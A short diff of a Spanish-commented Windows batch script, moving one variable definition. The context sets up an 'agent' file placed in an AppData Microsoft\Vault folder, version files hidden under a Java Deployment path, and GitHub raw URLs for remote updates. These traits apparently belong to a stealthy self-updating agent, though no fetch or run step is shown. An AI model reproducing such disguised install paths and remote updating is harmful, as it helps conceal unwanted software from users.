@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :: --- 1. CONFIGURACIÓN DE RUTAS Y VERSIONES ---
-set "VERSION_LOCAL=%VERSION_DIR%\v_data.txt"
+
 :: Corregido el doble Roaming para que coincida con el instalador
 set "AGENTE_DIR=%AppData%\Microsoft\Vault"
 set "AGENTE_FILE=%AGENTE_DIR%\sys_engine.bat"   
@@ -11,7 +11,7 @@ set "VERSION_DIR=C:\Users\%USERNAME%\AppData\Roaming\Sun\Java\Deployment"
 ::set "VLINEA=%temp%\v_data.txt"
 set "VLINEA=C:\Users\%USERNAME%\AppData\Roaming\Sun\Java\Deployment\lv_data.txt"
 set "MEM_DIR=%VERSION_DIR%"
-
+set "VERSION_LOCAL=%VERSION_DIR%\v_data.txt"
 :: URLs de GitHub
 set "URL_BASE=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets"
 set "URL_VERSION=%URL_BASE%/version.txt"
